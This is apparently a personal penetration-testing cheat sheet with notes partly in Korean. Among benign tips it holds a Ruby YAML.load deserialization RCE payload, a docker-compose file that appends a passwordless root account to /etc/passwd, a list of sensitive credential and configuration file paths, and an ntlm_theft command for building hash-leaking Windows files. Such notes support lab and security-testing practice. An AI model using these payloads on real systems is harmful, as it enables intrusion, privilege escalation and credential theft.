- AD라고 해서 꼭 AD만으로 풀려고 하면 안풀리는 경우가 있다 !
---
# Ruby YAML.load exploit
```bash
# cat ex.yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```
- https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/
---
# MOSH(mobile shell)
<img width="602" height="216" alt="image" src="https://github.com/user-attachments/assets/f1471976-9b5c-49d0-9416-ce866a768be1" />


---
# windows ssh file location
```powershell
C:\Users\<Username>\.ssh
```
---
# FTP
- `ls -al`로 숨겨진 파일 확인 가능.
- dir 안될 때 `passive` 입력해서 만들어주기.
- 업로드가 가능한지 확인
---
# Interesting File Path
```bash
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
~/home/user/.bash_history

/etc/apache2/sites-enabled/000-default.conf
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/httpd/error_log
/var/log/messages
/var/log/cron.log
/var/log/auth.log

/var/www/html/wp-config.php <-- Wordpress
/var/www/configuration.php <-- Joomla
/var/www/html/inc/header.inc.php <-- Dolphin
/var/www/html/sites/default/settings.php <-- Drupal
/var/www/configuration.php <-- Mambo
/var/www/config.php <-- PHP
```
```powershell
C:/Windows/System32/drivers/etc/hosts
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/Panther/Unattend.txt
C:/Unattend.xml
C:/Autounattend.xml
C:/Windows/system32/sysprep

C:/inetpub/wwwroot
C:/inetpub/wwwroot/web.config
C:/inetpub/logs/logfiles
```
---
# Make ODT File(Libre Office)
- https://github.com/0bfxgh0st/MMG-LO
---
# glassfish important file location
```bash
glassfish4/glassfish/domains/domain1/config/admin-keyfile and
glassfish4/glassfish/domains/domain1/config/local-password
```
---
# dosbox
- GUI 상태에서 정상 작동
---
# Create malicious Windows file
```bash
python3 ntlm_theft.py -g lnk -s <ip> -f vault
```
- https://github.com/Greenwolf/ntlm_theft
---
# Path variables
```powershell
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```
```bash
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```
---
# docker-compose.yaml exploit
```bash
#cat docker-compose.yaml
version: "3.8"

services:
  suidbash:
    image: ubuntu:latest
    container_name: suid_bash_container
    volumes:
      - /etc/passwd:/mnt/passwd:rw
    entrypoint: ["/bin/bash", "-c", "echo 'root2::0:0::/root:/bin/bash' >> /mnt/passwd && tail -f /dev/null"]
    tty: true
```
- root2 유저 추가
---
# Windows 재시작
```powershell
shutdown /r /t 0
```
---
# Python SSL requests error
- `verify=False`를 요청에다가 추가해주기
